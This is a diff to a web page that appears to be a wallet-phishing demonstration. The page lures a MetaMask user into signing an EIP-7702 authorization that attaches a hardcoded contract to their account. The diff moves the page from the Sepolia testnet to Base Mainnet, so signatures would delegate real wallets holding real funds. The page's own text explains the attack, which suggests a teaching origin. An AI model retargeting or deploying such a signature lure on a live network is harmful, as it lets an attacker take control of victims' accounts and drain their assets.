@@ -157,7 +157,7 @@
           You saw a generic signature request. The message looked like hex gibberish:
           <div class="code-block" id="authTupleDisplay"></div>
           But this wasn't random. It was an EIP-7702 authorization tuple:
-          <div class="code-block">[chain_id=11155111, delegateAddress=0x7ADf..., nonce, y_parity, r, s]</div>
+          <div class="code-block">[chain_id=8453, delegateAddress=0x7ADf..., nonce, y_parity, r, s]</div>
           Signing this gave the attacker the authorization to attach their contract to your EOA.
         </div>
       </div>
@@ -228,7 +228,7 @@ tx = {
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const SEPOLIA_CHAIN_ID = 11155111;
+  const BASE_MAINNET_CHAIN_ID = 8453;
   const DELEGATE_ADDRESS = "0x7ADf71B462aebf3Db3432CebE576F347cF73eDF3";
 
   let userAddress = null;
@@ -289,8 +289,8 @@ tx = {
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
 
-      if (chainId !== SEPOLIA_CHAIN_ID) {
-        alert(`Please switch to Sepolia (chainId ${SEPOLIA_CHAIN_ID})`);
+      if (chainId !== BASE_MAINNET_CHAIN_ID) {
+        alert(`Please switch to Base Mainnet (chainId ${BASE_MAINNET_CHAIN_ID})`);
         showPhase('phase-lure');
         return;
       }
@@ -300,7 +300,7 @@ tx = {
       userAddress = accounts[0];
 
       renderSteps([
-        { num:'1', state:'done', title:'Network: Sepolia', desc:'Chain ID 11155111' },
+        { num:'1', state:'done', title:'Network: Base Mainnet', desc:'Chain ID 8453' },
         { num:'2', state:'active', title:'Requesting signature', desc:'Sign the message in MetaMask' }
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask for the signature request.";
@@ -323,7 +323,7 @@ tx = {
       signedAuth = signature;
 
       renderSteps([
-        { num:'1', state:'done', title:'Network detected', desc:'Sepolia' },
+        { num:'1', state:'done', title:'Network detected', desc:'Base Mainnet' },
         { num:'2', state:'done', title:'Signature obtained', desc:'Authorization signed' }
       ]);
       document.getElementById('connectNote').textContent = "Verification complete. Loading dashboard...";
